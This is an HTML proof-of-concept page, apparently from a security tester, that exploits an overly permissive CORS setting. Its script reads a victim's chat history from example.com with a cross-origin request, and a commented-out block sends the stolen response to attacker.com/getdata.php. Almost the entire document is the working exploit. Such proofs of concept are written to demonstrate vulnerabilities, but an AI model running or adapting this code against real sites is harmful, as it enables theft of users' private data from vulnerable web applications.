<!DOCTYPE html>
<html>
<head>
	<meta name="author" content="Pichaya Morimoto">
	<title>Overly Permissive CORS Exploit PoC - Strictly Confidential</title>
<script>

var xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","https://example.com/getChatHistory?id=longcat",false);
xmlhttp.send();
alert(xmlhttp.responseText);
// if(xmlhttp.status==200)
// {
// 	var url = "http://attacker.com/getdata.php?html=" + escape(xmlhttp.responseText);
// 	xmlhttp.open("GET", url, true);
// 	xmlhttp.send();
// }

</script>
</head>
<body>
	<h1>LongCat</h1>
</body>
</body>
</html>